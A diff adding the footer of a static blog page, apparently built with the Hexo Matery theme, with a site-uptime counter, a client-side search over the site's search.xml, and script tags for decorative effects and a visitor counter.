+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis"></div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/xie1997.github.io/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/xie1997.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="/xie1997.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/xie1997.github.io/libs/aos/aos.js"></script>
+    <script src="/xie1997.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/xie1997.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/xie1997.github.io/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/xie1997.github.io/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/xie1997.github.io/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/xie1997.github.io/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/xie1997.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/xie1997.github.io/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/xie1997.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
